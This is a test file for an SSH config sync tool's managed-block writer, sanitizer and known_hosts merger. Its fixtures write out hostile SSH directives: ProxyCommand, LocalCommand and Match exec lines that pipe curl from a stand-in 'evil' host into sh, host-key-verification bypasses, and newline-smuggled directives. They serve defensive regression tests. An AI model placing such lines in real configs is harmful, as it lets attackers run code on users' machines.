import { describe, it, expect } from 'vitest';
import {
  parseManagedSshConfigBlock,
  writeManagedSshConfigBlock,
  mergeKnownHosts,
  sanitizeSshConfigBody,
  buildManagedSshConfigBlockFromProfiles,
  assignHostAliases,
  buildAgentSshConfigBody,
  writeAgentSshConfigBlock,
} from '../../src/main/services/SshNativeFileMerger';
import type { SSHConnectionConfig } from '../../src/shared/types/ssh';

function profile(overrides: Partial<SSHConnectionConfig> & Pick<SSHConnectionConfig, 'id' | 'host' | 'username'>): SSHConnectionConfig {
  return { name: overrides.id, authType: 'password', ...overrides };
}

describe('SshNativeFileMerger — ssh config managed block', () => {
  it('returns null when no managed block exists', () => {
    expect(parseManagedSshConfigBlock('Host foo\n  HostName foo.example.com\n')).toBeNull();
  });

  it('appends a managed block to a file that has none, leaving existing content untouched', () => {
    const original = 'Host myown\n  HostName myown.example.com\n';
    const result = writeManagedSshConfigBlock(original, { updatedAt: '2026-01-01T00:00:00.000Z', body: 'Host a\n  HostName a.example.com' });

    expect(result).toContain(original.trim());
    expect(result).toContain('BEGIN sshs3-managed');
    expect(result).toContain('Host a');
    expect(result).toContain('END sshs3-managed');
  });

  it('round-trips a managed block through write then parse', () => {
    const written = writeManagedSshConfigBlock('', {
      updatedAt: '2026-02-02T00:00:00.000Z',
      body: 'Host prod\n  HostName prod.example.com\n  User admin',
    });
    const parsed = parseManagedSshConfigBlock(written);

    expect(parsed?.updatedAt).toBe('2026-02-02T00:00:00.000Z');
    expect(parsed?.body).toBe('Host prod\n  HostName prod.example.com\n  User admin');
  });

  it('replaces an existing managed block in place without touching content outside it', () => {
    const original = [
      'Host myown',
      '  HostName myown.example.com',
      '',
      writeManagedSshConfigBlock('', { updatedAt: '2026-01-01T00:00:00.000Z', body: 'Host old\n  HostName old.example.com' }).trim(),
      '',
      'Host another',
      '  HostName another.example.com',
      '',
    ].join('\n');

    const updated = writeManagedSshConfigBlock(original, { updatedAt: '2026-03-03T00:00:00.000Z', body: 'Host new\n  HostName new.example.com' });

    expect(updated).toContain('Host myown');
    expect(updated).toContain('Host another');
    expect(updated).toContain('Host new');
    expect(updated).not.toContain('Host old');
  });

  it('sanitizeSshConfigBody strips ProxyCommand/LocalCommand/PermitLocalCommand/RemoteCommand/Match/Include directives', () => {
    const body = [
      'Host evil',
      '  HostName evil.example.com',
      '  ProxyCommand curl -s https://evil/x | sh',
      '  PermitLocalCommand yes',
      '  LocalCommand curl -s https://evil/y | sh',
      '  RemoteCommand touch /tmp/pwned',
      'Match exec "curl -s https://evil/z | sh"',
      'Include /tmp/evil-include.conf',
      '  User admin',
    ].join('\n');

    const { body: sanitized, removedLines } = sanitizeSshConfigBody(body);

    expect(sanitized).toContain('Host evil');
    expect(sanitized).toContain('HostName evil.example.com');
    expect(sanitized).toContain('User admin');
    expect(sanitized).not.toMatch(/ProxyCommand/i);
    expect(sanitized).not.toMatch(/LocalCommand/i);
    expect(sanitized).not.toMatch(/RemoteCommand/i);
    expect(sanitized).not.toMatch(/^Match/im);
    expect(sanitized).not.toMatch(/Include/i);
    expect(removedLines.length).toBe(6);
  });

  // Regression test for the C3 finding (code review): the blocklist used to
  // miss directives that silently disable host-key verification or run an
  // arbitrary command via KnownHostsCommand, so a synced managed block could
  // plant one of these into the user's real ~/.ssh/config.
  it('sanitizeSshConfigBody strips KnownHostsCommand/StrictHostKeyChecking/UserKnownHostsFile/GlobalKnownHostsFile/HostbasedAuthentication/IdentityAgent directives', () => {
    const body = [
      'Host evil',
      '  HostName evil.example.com',
      '  KnownHostsCommand /tmp/evil-command %H',
      '  StrictHostKeyChecking no',
      '  UserKnownHostsFile /dev/null',
      '  GlobalKnownHostsFile /dev/null',
      '  HostbasedAuthentication yes',
      '  IdentityAgent /tmp/attacker.sock',
      '  User admin',
    ].join('\n');

    const { body: sanitized, removedLines } = sanitizeSshConfigBody(body);

    expect(sanitized).toContain('Host evil');
    expect(sanitized).toContain('User admin');
    expect(sanitized).not.toMatch(/KnownHostsCommand/i);
    expect(sanitized).not.toMatch(/StrictHostKeyChecking/i);
    expect(sanitized).not.toMatch(/UserKnownHostsFile/i);
    expect(sanitized).not.toMatch(/GlobalKnownHostsFile/i);
    expect(sanitized).not.toMatch(/HostbasedAuthentication/i);
    expect(sanitized).not.toMatch(/IdentityAgent/i);
    expect(removedLines.length).toBe(6);
  });

  it('is case-insensitive and handles "Key=Value" syntax for blocked directives', () => {
    const { sanitized, removed } = (() => {
      const r = sanitizeSshConfigBody('Host x\n  proxycommand=nc %h %p\n  HostName x.example.com');
      return { sanitized: r.body, removed: r.removedLines };
    })();
    expect(sanitized).not.toMatch(/proxycommand/i);
    expect(sanitized).toContain('HostName x.example.com');
    expect(removed.length).toBe(1);
  });

  it('writeManagedSshConfigBlock never writes a blocked directive synced from remote', () => {
    const maliciousBody = 'Host *\n  ProxyCommand curl -s https://evil/x | sh\n  User admin';
    const result = writeManagedSshConfigBlock('', { updatedAt: '2026-01-01T00:00:00.000Z', body: maliciousBody });

    expect(result).not.toMatch(/ProxyCommand/i);
    expect(result).toContain('User admin');

    const parsed = parseManagedSshConfigBlock(result);
    expect(parsed?.body).not.toMatch(/ProxyCommand/i);
  });
});

describe('SshNativeFileMerger — generating the managed block from SSH profiles', () => {
  it('emits a Host block per profile, with only the safe connection-shape fields', () => {
    const { body } = buildManagedSshConfigBlockFromProfiles(
      [
        profile({
          id: 'ssh-1',
          name: 'prod',
          host: 'prod.example.com',
          port: 2222,
          username: 'deploy',
          authType: 'privateKey',
          privateKeyPath: '/home/user/.ssh/id_prod',
          forwardAgent: true,
          proxyJump: 'bastion.example.com',
        }),
      ],
      null,
      '2026-01-01T00:00:00.000Z'
    );

    expect(body).toBe(
      [
        'Host prod',
        '    HostName prod.example.com',
        '    Port 2222',
        '    User deploy',
        '    IdentityFile /home/user/.ssh/id_prod',
        '    ProxyJump bastion.example.com',
        '    ForwardAgent yes',
      ].join('\n')
    );
  });

  it('never emits secrets (password/passphrase/pin) — native ssh just prompts for them as before', () => {
    const { body } = buildManagedSshConfigBlockFromProfiles(
      [profile({ id: 'ssh-1', host: 'h.example.com', username: 'u', authType: 'password', password: 'super-secret' })],
      null
    );
    expect(body).not.toMatch(/super-secret/);
  });

  it('strips directives outside the managed-block allowlist from a received block', () => {
    const { body, removedLines } = sanitizeSshConfigBody(
      [
        'Host box',
        '    HostName box.example.com',
        '    User admin',
        '    VerifyHostKeyDNS yes',
        '    CanonicalizeHostname always',
        '    UpdateHostKeys no',
        '    Compression yes',
      ].join('\n')
    );

    expect(removedLines.map((l) => l.trim())).toEqual([
      'VerifyHostKeyDNS yes',
      'CanonicalizeHostname always',
      'UpdateHostKeys no',
    ]);
    expect(body).toContain('HostName box.example.com');
    expect(body).toContain('Compression yes');
  });

  it('never writes SendEnv into the managed block and strips it from a received one (M4)', () => {
    const { body } = buildManagedSshConfigBlockFromProfiles(
      [profile({ id: 'ssh-1', host: 'h.example.com', username: 'u', extraOptions: { SendEnv: '*', SetEnv: 'FOO=bar' } })],
      null
    );
    expect(body).not.toMatch(/SendEnv/i);
    expect(body).toContain('SetEnv FOO=bar');

    const received = sanitizeSshConfigBody(['Host box', '    HostName box.example.com', '    SendEnv *', '    SetEnv FOO=bar'].join('\n'));
    expect(received.removedLines.map((l) => l.trim())).toEqual(['SendEnv *']);
    expect(received.body).toContain('SetEnv FOO=bar');
  });

  it('only emits allowlisted extraOptions, so a directive smuggled in via sync never reaches the file', () => {
    const { body } = buildManagedSshConfigBlockFromProfiles(
      [
        profile({
          id: 'ssh-1',
          host: 'h.example.com',
          username: 'u',
          extraOptions: { ProxyCommand: 'curl -s https://evil/x | sh', Compression: 'yes' },
        }),
      ],
      null
    );
    expect(body).not.toMatch(/ProxyCommand/i);
    expect(body).toContain('Compression yes');
    // The generic sanitize pass stays as a second line of defense for received blocks.
    expect(sanitizeSshConfigBody(body).removedLines).toEqual([]);
  });

  it('de-duplicates Host aliases that collide after sanitizing profile names', () => {
    const { body } = buildManagedSshConfigBlockFromProfiles(
      [
        profile({ id: 'ssh-1', name: 'my box', host: 'a.example.com', username: 'u' }),
        profile({ id: 'ssh-2', name: 'my box', host: 'b.example.com', username: 'u' }),
      ],
      null
    );
    expect(body).toContain('Host my-box\n');
    expect(body).toContain('Host my-box-2\n');
  });

  it('reuses the previous timestamp when regeneration produces the same body (no spurious "ahead")', () => {
    const profiles = [profile({ id: 'ssh-1', name: 'a', host: 'a.example.com', username: 'u' })];
    const first = buildManagedSshConfigBlockFromProfiles(profiles, null, '2026-01-01T00:00:00.000Z');
    const second = buildManagedSshConfigBlockFromProfiles(profiles, first, '2026-06-01T00:00:00.000Z');

    expect(second.body).toBe(first.body);
    expect(second.updatedAt).toBe('2026-01-01T00:00:00.000Z');
  });

  it('bumps the timestamp when the generated body actually changes', () => {
    const first = buildManagedSshConfigBlockFromProfiles(
      [profile({ id: 'ssh-1', name: 'a', host: 'a.example.com', username: 'u' })],
      null,
      '2026-01-01T00:00:00.000Z'
    );
    const second = buildManagedSshConfigBlockFromProfiles(
      [profile({ id: 'ssh-1', name: 'a-renamed', host: 'a.example.com', username: 'u' })],
      first,
      '2026-06-01T00:00:00.000Z'
    );

    expect(second.body).not.toBe(first.body);
    expect(second.updatedAt).toBe('2026-06-01T00:00:00.000Z');
  });
});

describe('SshNativeFileMerger — known_hosts', () => {
  const KEY_A = Buffer.from('ssh-ed25519-fake-key-material-a').toString('base64');
  const KEY_B = Buffer.from('ssh-ed25519-fake-key-material-b').toString('base64');

  it('appends new host entries from remote that are missing locally', () => {
    const local = `host-a.example.com ssh-ed25519 ${KEY_A}\n`;
    const remote = `host-a.example.com ssh-ed25519 ${KEY_A}\nhost-b.example.com ssh-ed25519 ${KEY_B}\n`;

    const result = mergeKnownHosts(local, remote);

    expect(result.changed).toBe(true);
    expect(result.addedCount).toBe(1);
    expect(result.conflicts).toHaveLength(0);
    expect(result.mergedContent).toContain('host-a.example.com');
    expect(result.mergedContent).toContain('host-b.example.com');
  });

  it('is a no-op when remote has nothing new', () => {
    const local = `host-a.example.com ssh-ed25519 ${KEY_A}\n`;
    const result = mergeKnownHosts(local, local);

    expect(result.changed).toBe(false);
    expect(result.addedCount).toBe(0);
    expect(result.mergedContent).toBe(local);
  });

  it('never removes or rewrites local lines', () => {
    const local = `stale-host.example.com ssh-rsa ${KEY_A}\n`;
    const remote = `new-host.example.com ssh-ed25519 ${KEY_B}\n`;

    const result = mergeKnownHosts(local, remote);

    expect(result.mergedContent).toContain('stale-host.example.com ssh-rsa');
    expect(result.mergedContent).toContain('new-host.example.com ssh-ed25519');
  });

  it('flags a host-key mismatch as a conflict instead of silently applying it', () => {
    const local = `shared-host.example.com ssh-ed25519 ${KEY_A}\n`;
    const remote = `shared-host.example.com ssh-ed25519 ${KEY_B}\n`;

    const result = mergeKnownHosts(local, remote);

    expect(result.changed).toBe(false);
    expect(result.addedCount).toBe(0);
    expect(result.conflicts).toHaveLength(1);
    expect(result.conflicts[0].hostPatternField).toBe('shared-host.example.com');
    expect(result.conflicts[0].localFingerprint).toMatch(/^SHA256:/);
    expect(result.conflicts[0].remoteFingerprint).toMatch(/^SHA256:/);
    expect(result.mergedContent).toBe(local);
  });

  it('allows different key algorithms for the same host without conflict', () => {
    const KEY_RSA = Buffer.from('ssh-rsa-fake-key-material').toString('base64');
    const local = `shared-host.example.com ssh-ed25519 ${KEY_A}\n`;
    const remote = `shared-host.example.com ssh-rsa ${KEY_RSA}\n`;

    const result = mergeKnownHosts(local, remote);

    expect(result.changed).toBe(true);
    expect(result.addedCount).toBe(1);
    expect(result.conflicts).toHaveLength(0);
    expect(result.mergedContent).toContain(`shared-host.example.com ssh-ed25519 ${KEY_A}`);
    expect(result.mergedContent).toContain(`shared-host.example.com ssh-rsa ${KEY_RSA}`);
  });

  it('ignores comment, blank, and @-marker lines', () => {
    const local = '# comment\n\n@cert-authority *.example.com ssh-ed25519 abc\n';
    const remote = `host-a.example.com ssh-ed25519 ${KEY_A}\n`;

    const result = mergeKnownHosts(local, remote);
    expect(result.changed).toBe(true);
    expect(result.addedCount).toBe(1);
  });

  it('checks every name of a comma list, so an alias cannot hide a key clash', () => {
    const local = `prod.example.com ssh-ed25519 ${KEY_A}\n`;
    const remote = `prod.example.com,10.0.0.1 ssh-ed25519 ${KEY_B}\n`;

    const result = mergeKnownHosts(local, remote);

    expect(result.changed).toBe(false);
    expect(result.conflicts).toHaveLength(1);
    expect(result.conflicts[0].hostPatternField).toBe('prod.example.com,10.0.0.1');
    // The same applies when the local line is the list.
    const listed = mergeKnownHosts(`prod.example.com,10.0.0.1 ssh-ed25519 ${KEY_A}\n`, `10.0.0.1 ssh-ed25519 ${KEY_B}\n`);
    expect(listed.conflicts).toHaveLength(1);
    expect(listed.changed).toBe(false);
  });

  it('treats a wildcard that covers a known host with another key as a conflict', () => {
    const local = `prod.example.com ssh-ed25519 ${KEY_A}\n`;

    const wild = mergeKnownHosts(local, `*.example.com ssh-ed25519 ${KEY_B}\n`);
    expect(wild.changed).toBe(false);
    expect(wild.conflicts).toHaveLength(1);

    const single = mergeKnownHosts(local, `prod.exampl?.com ssh-ed25519 ${KEY_B}\n`);
    expect(single.conflicts).toHaveLength(1);

    // A literal host that a local wildcard line already covers, with another key, clashes too.
    const reverse = mergeKnownHosts(`*.example.com ssh-ed25519 ${KEY_A}\n`, `prod.example.com ssh-ed25519 ${KEY_B}\n`);
    expect(reverse.conflicts).toHaveLength(1);
    expect(reverse.changed).toBe(false);
  });

  it('still adds a narrow wildcard or a new host that clashes with nothing', () => {
    const local = `prod.example.com ssh-ed25519 ${KEY_A}\n`;

    const narrow = mergeKnownHosts(local, `*.corp.internal ssh-ed25519 ${KEY_B}\n`);
    expect(narrow.conflicts).toHaveLength(0);
    expect(narrow.addedCount).toBe(1);

    const sameKey = mergeKnownHosts(local, `*.example.com ssh-ed25519 ${KEY_A}\n`);
    expect(sameKey.conflicts).toHaveLength(0);
    expect(sameKey.addedCount).toBe(1);

    const hashed = mergeKnownHosts(local, `|1|c2FsdA==|aGFzaA== ssh-ed25519 ${KEY_B}\n`);
    expect(hashed.addedCount).toBe(1);
  });

  it('never imports a catch-all or negated pattern, or a line that is not a key', () => {
    const local = `prod.example.com ssh-ed25519 ${KEY_A}\n`;
    for (const line of [
      `* ssh-ed25519 ${KEY_B}`,
      `*.* ssh-ed25519 ${KEY_B}`,
      `? ssh-ed25519 ${KEY_B}`,
      `new.example.com,* ssh-ed25519 ${KEY_B}`,
      `*.example.com,!prod.example.com ssh-ed25519 ${KEY_B}`,
      `new.example.com ssh-ed25519 not*base64!`,
      `new.example.com bad/type ${KEY_B}`,
    ]) {
      const result = mergeKnownHosts(local, `${line}\n`);
      expect(result.changed, line).toBe(false);
      expect(result.addedCount, line).toBe(0);
      expect(result.mergedContent, line).toBe(local);
    }
  });

  it('matches wildcards without regex blow-up on a hostile pattern', () => {
    // A hostile wildcard on the local side is matched against a long remote name.
    const local = `${'*a'.repeat(40)}*b ssh-ed25519 ${KEY_A}\n`;
    const started = Date.now();
    mergeKnownHosts(local, `${'a'.repeat(200)}.example.com ssh-ed25519 ${KEY_B}\n`);
    expect(Date.now() - started).toBeLessThan(1000);
  });

  it('compares host names case-insensitively, but not hashed entries', () => {
    const local = `github.com ssh-ed25519 ${KEY_A}\n`;
    const upper = mergeKnownHosts(local, `GITHUB.COM ssh-ed25519 ${KEY_B}\n`);
    expect(upper.changed).toBe(false);
    expect(upper.conflicts).toHaveLength(1);
    const listed = mergeKnownHosts(local, `x.example.com,GitHub.Com ssh-ed25519 ${KEY_B}\n`);
    expect(listed.conflicts).toHaveLength(1);

    // Two different hashes only differ in case: they are different hosts, not a clash.
    const hashedLocal = `|1|AAAA|BBBB ssh-ed25519 ${KEY_A}\n`;
    const hashed = mergeKnownHosts(hashedLocal, `|1|aaaa|bbbb ssh-ed25519 ${KEY_B}\n`);
    expect(hashed.conflicts).toHaveLength(0);
    expect(hashed.addedCount).toBe(1);
  });

  it('refuses a wildcard that covers a whole class of hosts, but keeps one that names its domain', () => {
    const local = `prod.example.com ssh-ed25519 ${KEY_A}\n`;
    for (const pattern of ['*e*', '*.com', '10.*', 'prod-*', '?', '*.*.*', '[*]:22']) {
      const result = mergeKnownHosts(local, `${pattern} ssh-ed25519 ${KEY_B}\n`);
      expect(result.addedCount, pattern).toBe(0);
      expect(result.conflicts, pattern).toHaveLength(0);
    }
    for (const pattern of ['*.corp.internal', 'web?.corp.internal', '192.168.*', '[*.corp.internal]:2222']) {
      expect(mergeKnownHosts(local, `${pattern} ssh-ed25519 ${KEY_B}\n`).addedCount, pattern).toBe(1);
    }
  });
});

describe('sanitizeSshConfigBody path quoting', () => {
  it('quotes unquoted PKCS11Provider/IdentityFile paths containing spaces', () => {
    const { body } = sanitizeSshConfigBody(
      String.raw`Host x
    PKCS11Provider C:\Program Files\OpenSC Project\pkcs11\opensc-pkcs11.dll
    IdentityFile ~/.ssh/id_ed25519`
    );
    expect(body).toContain('    PKCS11Provider "C:/Program Files/OpenSC Project/pkcs11/opensc-pkcs11.dll"');
    expect(body).toContain('    IdentityFile ~/.ssh/id_ed25519');
  });

  it('leaves already-quoted values alone', () => {
    const line = '    PKCS11Provider "C:/Program Files/x/y.dll"';
    expect(sanitizeSshConfigBody(line).body).toBe(line);
  });
});

describe('sanitizeSshConfigBody path quoting (non-Windows safety)', () => {
  it('leaves a Linux path with spaces but no drive letter byte-for-byte apart from the quotes', () => {
    const { body } = sanitizeSshConfigBody('    IdentityFile ~/My Keys/id_ed25519');
    expect(body).toBe('    IdentityFile "~/My Keys/id_ed25519"');
  });

  it('does not touch a line with a trailing comment', () => {
    const line = '    IdentityFile ~/.ssh/id_ed25519 # work key';
    expect(sanitizeSshConfigBody(line).body).toBe(line);
  });

  it('leaves ordinary lines (no spaces in the value) untouched', () => {
    const line = '    IdentityFile ~/.ssh/id_ed25519';
    expect(sanitizeSshConfigBody(line).body).toBe(line);
  });

  it('never lets a profile field smuggle a second directive line', () => {
    const { body } = buildManagedSshConfigBlockFromProfiles(
      [profile({ id: 'ssh-x', name: 'x', host: 'h.example.com\n    ProxyCommand evil', username: 'u', authType: 'password' })],
      null,
      '2026-01-01T00:00:00.000Z'
    );
    expect(body.split('\n').some((l) => l.trim().startsWith('ProxyCommand'))).toBe(false);
  });

  it('sanitizer also blocks quoted directive keywords', () => {
    const { body, removedLines } = sanitizeSshConfigBody(
      ['Host a', '    "ProxyCommand" evil', "    'LocalCommand' evil", '    "Port" 22'].join('\n')
    );
    expect(removedLines).toHaveLength(2);
    expect(body).toContain('"Port" 22');
    expect(body).not.toMatch(/evil/);
  });
});

describe('SshNativeFileMerger — local agent block', () => {
  const managed = (body = 'Host card\n    HostName card.example.com\n    PKCS11Provider /usr/lib/opensc-pkcs11.so') =>
    writeManagedSshConfigBlock('Host mine\n  HostName mine.example.com\n', { updatedAt: '2026-01-01T00:00:00.000Z', body });
  const entry = { alias: 'card', agentSocket: '/run/user/1000/sshs3/agent.sock', identityFiles: ['/run/user/1000/sshs3/keys/aa.pub'] };

  it('uses the same Host alias the managed block gets (incl. collisions)', () => {
    const profiles = [
      profile({ id: 'b', name: 'prod web', host: 'b.example.com', username: 'u' }),
      profile({ id: 'a', name: 'prod web', host: 'a.example.com', username: 'u' }),
    ];
    const aliases = assignHostAliases(profiles);
    const { body } = buildManagedSshConfigBlockFromProfiles(profiles, null, '2026-01-01T00:00:00.000Z');
    for (const alias of aliases.values()) expect(body).toContain(`Host ${alias}\n`);
    expect(new Set(aliases.values()).size).toBe(2);
  });

  it('builds fixed-template overrides: agent, the card\'s key files, IdentitiesOnly and PKCS11Provider none', () => {
    expect(buildAgentSshConfigBody([entry])).toBe(
      [
        'Host card',
        '    IdentityAgent /run/user/1000/sshs3/agent.sock',
        '    IdentityFile /run/user/1000/sshs3/keys/aa.pub',
        '    IdentitiesOnly yes',
        '    PKCS11Provider none',
      ].join('\n')
    );
    expect(buildAgentSshConfigBody([])).toBe('');
    expect(buildAgentSshConfigBody([{ ...entry, identityFiles: [] }])).toBe('');
  });

  it('quotes paths with spaces, escapes %, and cannot be used to inject another directive', () => {
    const body = buildAgentSshConfigBody([
      { alias: 'card', agentSocket: '/tmp/my dir/agent.sock', identityFiles: ['/tmp/100%/k.pub\n    ProxyCommand evil'] },
    ]);
    expect(body).toContain('IdentityAgent "/tmp/my dir/agent.sock"');
    expect(body).toContain('%%');
    expect(body.split('\n').some((l) => l.trim().startsWith('ProxyCommand'))).toBe(false);
  });

  it('inserts the block directly before the managed block, replaces it, and removes it again', () => {
    const base = managed();
    const withBlock = writeAgentSshConfigBlock(base, buildAgentSshConfigBody([entry]));

    expect(withBlock.indexOf('BEGIN sshs3-agent')).toBeGreaterThan(withBlock.indexOf('Host mine'));
    expect(withBlock.indexOf('END sshs3-agent')).toBeLessThan(withBlock.indexOf('BEGIN sshs3-managed'));
    expect(withBlock).toContain('IdentityAgent /run/user/1000/sshs3/agent.sock');

    const replaced = writeAgentSshConfigBlock(withBlock, buildAgentSshConfigBody([{ ...entry, alias: 'other' }]));
    expect(replaced.match(/BEGIN sshs3-agent/g)).toHaveLength(1);
    expect(replaced).toContain('Host other');
    expect(replaced).not.toContain('Host card\n    IdentityAgent');

    expect(writeAgentSshConfigBlock(replaced, null)).toBe(base);
    expect(writeAgentSshConfigBlock(base, '')).toBe(base);
  });

  it('never touches the managed block (so its sync timestamp and body stay as they were)', () => {
    const base = managed();
    const before = parseManagedSshConfigBlock(base)!;
    const after = parseManagedSshConfigBlock(writeAgentSshConfigBlock(base, buildAgentSshConfigBody([entry])))!;
    expect(after).toEqual(before);
    // and a later managed-block rewrite keeps the agent block
    const rewritten = writeManagedSshConfigBlock(writeAgentSshConfigBlock(base, buildAgentSshConfigBody([entry])), {
      updatedAt: '2026-02-01T00:00:00.000Z',
      body: 'Host card\n    HostName changed.example.com',
    });
    expect(rewritten).toContain('BEGIN sshs3-agent');
    expect(rewritten).toContain('changed.example.com');
  });

  it('is not fooled by a stray END marker before the block, and does not duplicate the block', () => {
    const base = managed();
    const withBlock = writeAgentSshConfigBlock(base, buildAgentSshConfigBody([entry]));
    const poisoned = `# END sshs3-agent\n${withBlock}`;

    const updated = writeAgentSshConfigBlock(poisoned, buildAgentSshConfigBody([{ ...entry, alias: 'other' }]));
    expect(updated.match(/BEGIN sshs3-agent/g)).toHaveLength(1);
    expect(updated).toContain('Host other');
    expect(updated.startsWith('# END sshs3-agent\n')).toBe(true);
  });

  it('adds nothing when there is no managed block to override', () => {
    const original = 'Host mine\n  HostName mine.example.com\n';
    expect(writeAgentSshConfigBlock(original, buildAgentSshConfigBody([entry]))).toBe(original);
  });

  it('IdentityAgent is still stripped from a *synced* block (the agent block is local-only)', () => {
    const { body, removedLines } = sanitizeSshConfigBody('Host x\n    IdentityAgent /tmp/evil.sock\n    Port 22');
    expect(removedLines).toHaveLength(1);
    expect(body).not.toContain('IdentityAgent');
  });
});
